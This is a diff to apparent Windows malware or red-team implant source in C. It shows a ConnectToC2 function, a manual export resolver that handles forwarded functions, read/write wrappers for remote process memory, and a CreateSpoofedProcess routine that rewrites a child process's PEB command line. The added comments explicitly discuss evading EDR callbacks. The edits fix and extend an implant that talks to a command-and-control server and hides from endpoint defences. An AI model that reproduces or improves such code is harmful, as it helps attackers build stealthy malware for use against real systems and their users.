@@ -70,6 +70,23 @@ DWORD Djb2W(BYTE* Data) {
     return Hash;
 }
 
+LPCWSTR ConvertDataToLPCWSTR(BYTE* Data) {
+    if (!Data) return NULL;
+
+    // Get required size for the WCHAR buffer
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, (LPCCH)Data, -1, NULL, 0);
+    if (size_needed == 0) return NULL;
+    
+    // Allocate buffer on the heap
+    LPWSTR wstr = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size_needed * sizeof(WCHAR));
+    if (!wstr) return NULL;
+
+    // Perform the actual conversion
+    MultiByteToWideChar(CP_UTF8, 0, (LPCCH)Data, -1, wstr, size_needed);
+    
+    return (LPCWSTR)wstr;
+}
+
 BOOL ConnectToC2(SOCKET* c2Socket){
     WSADATA wsaData;
     *c2Socket = INVALID_SOCKET;
@@ -204,36 +221,50 @@ FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
             WORD wFunctionOrdinal = FunctionOrdinalArray[i];
             DWORD dwFunctionRVA = FunctionAddressArray[wFunctionOrdinal];
 
-            // Test de Forwarding : l'adresse pointe dans la section d'export elle-même
+            // Is the function forwarded to another DLL ? (dwFunctionRVA points inside the export directory)
+            // Check if RVA is within the export directory (Forwarded function)
             if (dwFunctionRVA >= exportDirInfo.VirtualAddress && 
                 dwFunctionRVA < (exportDirInfo.VirtualAddress + exportDirInfo.Size)) {
                 
-                CHAR szForwarder[256];
-                strcpy_s(szForwarder, (CHAR*)(pBase + dwFunctionRVA));
+                // forwarded string : e.g "KERNEL32.Sleep" or "KERNEL32.#12"
+                CHAR szForwarder[256] = { 0 };
+                CHAR* pForwardString = (CHAR*)(pBase + dwFunctionRVA);
 
+                strncpy_s(szForwarder, sizeof(szForwarder), pForwardString, _TRUNCATE);
+
+                // Find the dot separator
                 CHAR* pDot = strchr(szForwarder, '.');
                 if (!pDot) return NULL;
 
+                // Mutate the stack copy to split DLL name and function name
                 *pDot = '\0';
-                CHAR* pRealFuncName = pDot + 1;
+                CHAR* pRealFuncName = pDot + 1; // Can be a name or an ordinal (e.g., "#12")
 
-                // Conversion ANSI (du forwarder) vers WideChar pour votre CustomGetModuleHandleW
-                WCHAR wszForwarderDll[MAX_PATH];
+                // Note: If pRealFuncName starts with '#', you MUST handle it as an ordinal
+                // in your CustomGetProcAddress implementation.
+
+                // ANSI to WideChar conversion for custom module resolution
+                WCHAR wszForwarderDll[MAX_PATH] = { 0 };
                 size_t convertedChars = 0;
                 mbstowcs_s(&convertedChars, wszForwarderDll, MAX_PATH, szForwarder, _TRUNCATE);
                 
-                // Ajout de l'extension .dll si absente (certains forwarders l'omettent)
+                // Add .dll extension if missing
                 if (wcsstr(wszForwarderDll, L".dll") == NULL && wcsstr(wszForwarderDll, L".DLL") == NULL) {
                     wcscat_s(wszForwarderDll, MAX_PATH, L".dll");
                 }
 
+                // Try to get the handle from the PEB (In-Memory modules)
                 HMODULE hForwardDll = CustomGetModuleHandleW(wszForwarderDll);
                 
-                // Si le module n'est pas chargé, on utilise LoadLibraryW (standard) 
-                // ou votre propre implémentation de mapping.
-                if (!hForwardDll) hForwardDll = LoadLibraryW(wszForwarderDll);
+                // OPSEC WARNING: Falling back to LoadLibraryW triggers EDR callbacks.
+                // In a strict environment, you should implement a custom PE loader here.
+                if (!hForwardDll) {
+                    hForwardDll = LoadLibraryW(wszForwarderDll); 
+                }
+
                 if (!hForwardDll) return NULL;
 
+                // Recursive call to resolve the final target
                 return CustomGetProcAddress(hForwardDll, pRealFuncName);
             }
 
@@ -250,6 +281,18 @@ BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVO
     if (!WrapperWriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
         printf("[!] WriteProcessMemory Failed With Error : %u \n", GetLastError());
         printf("[i] Bytes Written : %llu Of %llu \n", (unsigned long long)sNmbrOfBytesWritten, (unsigned long long)dwBufferSize);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN LPCVOID pAddressToReadFrom, OUT PVOID pBuffer, IN SIZE_T dwBufferSize) {
+    SIZE_T sNmbrOfBytesRead = 0;
+
+    if (!WrapperReadProcessMemory(hProcess, pAddressToReadFrom, pBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
+        printf("[!] ReadProcessMemory Failed With Error : %u \n", GetLastError());
+        printf("[i] Bytes Read : %llu Of %llu \n", (unsigned long long)sNmbrOfBytesRead, (unsigned long long)dwBufferSize);
         return FALSE;
     }
 
@@ -393,13 +436,14 @@ HANDLE CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, L
         goto cleanup;
     }
 
-    PPEB pPeb = NULL;
-    PRTL_USER_PROCESS_PARAMETERS pParms = NULL;
-    
-    if (!ReadFromTargetProcess(Pi->hProcess, PBI.PebBaseAddress, (PVOID*)&pPeb, sizeof(PEB))) goto cleanup;
+    PPEB pPeb = (PPEB)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PEB));
+    PRTL_USER_PROCESS_PARAMETERS pParms = (PRTL_USER_PROCESS_PARAMETERS)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(RTL_USER_PROCESS_PARAMETERS));
 
-    // Lecture des paramètres distants
-    if (!ReadFromTargetProcess(Pi->hProcess, pPeb->ProcessParameters, (PVOID*)&pParms, sizeof(RTL_USER_PROCESS_PARAMETERS))) goto cleanup;
+    //Read remote PEB into our local buffer
+    if (!ReadFromTargetProcess(Pi->hProcess, PBI.PebBaseAddress, (PVOID)pPeb, sizeof(PEB))) goto cleanup;
+
+    // Read remote PEB.ProcessParameters into our local buffer
+    if (!ReadFromTargetProcess(Pi->hProcess, pPeb->ProcessParameters, (PVOID)pParms, sizeof(RTL_USER_PROCESS_PARAMETERS))) goto cleanup;
     
     SIZE_T effectiveArgs_bsz = (lstrlenW(procCmdLine) + 1) * sizeof(WCHAR); 
     
